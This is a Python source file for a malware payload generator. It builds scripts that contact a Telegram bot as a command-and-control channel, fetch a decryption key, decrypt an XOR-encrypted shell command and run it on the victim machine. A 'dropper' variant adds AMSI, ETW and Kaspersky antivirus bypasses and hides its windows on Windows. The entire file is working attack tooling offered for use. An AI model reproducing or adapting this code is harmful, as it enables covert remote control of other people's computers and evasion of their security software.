"""
Python Payload Generator – ASCII only, no smart quotes
"""

import base64
import random
import string
import time
import os
import re
from core.crypto import CryptoHandler
from core.av_bypass import AVBypass

class PayloadGenerator:
    def __init__(self, master_secret, salt, bot_token, payload_bot_token):
        self.crypto = CryptoHandler(master_secret, salt)
        self.av_bypass = AVBypass()
        self.bot_token = bot_token
        self.payload_bot_token = payload_bot_token

    def generate_payload(self, command, chat_id):
        key = self.crypto.get_current_key()
        encrypted = self.crypto.encrypt_payload(command, key)
        key_id = self.crypto.generate_key_id()
        self.crypto.store_key(key_id, key)

        script = self._build_python_payload(encrypted, key_id, chat_id)
        return script, key_id

    def generate_dropper(self, command, chat_id):
        encrypted, key_id = self.generate_payload(command, chat_id)
        script = self._build_python_dropper(encrypted, key_id, chat_id)
        return script

    def _build_python_payload(self, encrypted, key_id, chat_id):
        safe_encrypted = repr(encrypted)
        safe_key_id = repr(key_id)
        safe_payload_token = repr(self.payload_bot_token)

        return f'''
# -*- coding: utf-8 -*-
import base64
import json
import sys
import time
import urllib.request
import subprocess
import platform
import os

PAYLOAD_TOKEN = {safe_payload_token}
CHAT_ID = {chat_id}
KEY_ID = {safe_key_id}
ENCRYPTED = {safe_encrypted}

def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}/sendMessage"
        data = json.dumps({{
            "chat_id": CHAT_ID,
            "text": text
        }}).encode()
        req = urllib.request.Request(url, data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        sys.stderr.write("[DEBUG] Send error: " + str(e) + "\\n")
        return False

def get_key():
    try:
        sys.stderr.write("[DEBUG] Sending /getkey_" + KEY_ID + "\\n")
        send_message("/getkey_" + KEY_ID)

        api_url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}"
        offset = None

        for attempt in range(15):
            try:
                url = f"{{api_url}}/getUpdates?limit=10&timeout=20"
                if offset is not None:
                    url += f"&offset={{offset}}"

                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (waiting up to 20s)...\\n")
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req, timeout=25)
                data = json.loads(resp.read().decode())

                sys.stderr.write("[DEBUG] Got response\\n")

                if data.get('ok'):
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {{}})

                        if msg.get('chat', {{}}).get('id') == CHAT_ID:
                            text = msg.get('text', '')
                            sys.stderr.write("[DEBUG] Found message: " + text + "\\n")

                            if text and not text.startswith('/getkey_'):
                                sys.stderr.write("[DEBUG] Found key: " + text + "\\n")
                                return text
                else:
                    sys.stderr.write("[DEBUG] API error: " + str(data) + "\\n")
            except Exception as e:
                sys.stderr.write("[DEBUG] Poll error: " + str(e) + "\\n")
                continue

    except Exception as e:
        sys.stderr.write("[DEBUG] Outer error: " + str(e) + "\\n")
    return None

def decrypt(data, key):
    try:
        key_bytes = base64.b64decode(key)
        data_bytes = base64.b64decode(data)
        stretched = (key_bytes * (len(data_bytes) // len(key_bytes) + 1))[:len(data_bytes)]
        decrypted = bytes(a ^ b for a, b in zip(data_bytes, stretched))
        return decrypted.decode('utf-8')
    except Exception as e:
        sys.stderr.write("[DEBUG] Decrypt error: " + str(e) + "\\n")
        return None

def execute(command):
    try:
        sys.stderr.write("[DEBUG] Executing: " + command + "\\n")
        if platform.system() == 'Windows':
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        else:
            proc = subprocess.Popen(
                command,
                shell=True,
                executable='/bin/sh',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        stdout, stderr = proc.communicate()
        if proc.returncode == 0:
            return stdout or "Executed successfully"
        else:
            return f"Error: {{stderr}}"
    except Exception as e:
        return f"Error: {{e}}"

def main():
    sys.stderr.write("[DEBUG] Starting payload...\\n")
    key = get_key()
    if not key:
        sys.stderr.write("[DEBUG] Failed to get key\\n")
        print("Failed to get key", file=sys.stderr)
        return
    sys.stderr.write("[DEBUG] Key obtained: " + key + "\\n")
    command = decrypt(ENCRYPTED, key)
    if command:
        sys.stderr.write("[DEBUG] Decrypted command: " + command + "\\n")
        result = execute(command)
        print(result)
    else:
        sys.stderr.write("[DEBUG] Decryption failed\\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
'''

    def _build_python_dropper(self, encrypted, key_id, chat_id):
        amsi = self.av_bypass.get_amsi_bypass()
        etw = self.av_bypass.get_etw_bypass()
        kaspersky = self.av_bypass.get_kaspersky_bypass()

        safe_encrypted = repr(encrypted)
        safe_key_id = repr(key_id)
        safe_payload_token = repr(self.payload_bot_token)

        return f'''
# -*- coding: utf-8 -*-
{amsi}
{etw}
{kaspersky}

import base64
import json
import sys
import time
import urllib.request
import subprocess
import platform
import os
import ctypes

PAYLOAD_TOKEN = {safe_payload_token}
CHAT_ID = {chat_id}
KEY_ID = {safe_key_id}
ENCRYPTED = {safe_encrypted}

def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}/sendMessage"
        data = json.dumps({{
            "chat_id": CHAT_ID,
            "text": text
        }}).encode()
        req = urllib.request.Request(url, data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        sys.stderr.write("[DEBUG] Send error: " + str(e) + "\\n")
        return False

def get_key():
    try:
        sys.stderr.write("[DEBUG] Sending /getkey_" + KEY_ID + "\\n")
        send_message("/getkey_" + KEY_ID)

        api_url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}"
        offset = None

        for attempt in range(15):
            try:
                url = f"{{api_url}}/getUpdates?limit=10&timeout=20"
                if offset is not None:
                    url += f"&offset={{offset}}"

                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (waiting up to 20s)...\\n")
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req, timeout=25)
                data = json.loads(resp.read().decode())

                if data.get('ok'):
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {{}})

                        if msg.get('chat', {{}}).get('id') == CHAT_ID:
                            text = msg.get('text', '')
                            sys.stderr.write("[DEBUG] Found message: " + text + "\\n")

                            if text and not text.startswith('/getkey_'):
                                sys.stderr.write("[DEBUG] Found key: " + text + "\\n")
                                return text
            except Exception as e:
                sys.stderr.write("[DEBUG] Poll error: " + str(e) + "\\n")
                continue

    except Exception as e:
        sys.stderr.write("[DEBUG] Outer error: " + str(e) + "\\n")
    return None

def decrypt(data, key):
    try:
        key_bytes = base64.b64decode(key)
        data_bytes = base64.b64decode(data)
        stretched = (key_bytes * (len(data_bytes) // len(key_bytes) + 1))[:len(data_bytes)]
        decrypted = bytes(a ^ b for a, b in zip(data_bytes, stretched))
        return decrypted.decode('utf-8')
    except Exception as e:
        sys.stderr.write("[DEBUG] Decrypt error: " + str(e) + "\\n")
        return None

def execute_fileless(command):
    try:
        sys.stderr.write("[DEBUG] Executing: " + command + "\\n")
        if platform.system() == 'Windows':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            proc = subprocess.Popen(
                command,
                shell=True,
                executable='/bin/sh',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        stdout, stderr = proc.communicate()
        if proc.returncode == 0:
            return stdout or "Executed successfully"
        else:
            return f"Error: {{stderr}}"
    except Exception as e:
        return f"Error: {{e}}"

def main():
    sys.stderr.write("[DEBUG] Starting dropper...\\n")
    key = get_key()
    if not key:
        sys.stderr.write("[DEBUG] Failed to get key\\n")
        return
    sys.stderr.write("[DEBUG] Key obtained: " + key + "\\n")
    command = decrypt(ENCRYPTED, key)
    if command:
        sys.stderr.write("[DEBUG] Decrypted command: " + command + "\\n")
        result = execute_fileless(command)
        print(result)
    else:
        sys.stderr.write("[DEBUG] Decryption failed\\n")

if __name__ == "__main__":
    try:
        main()
    except:
        pass
'''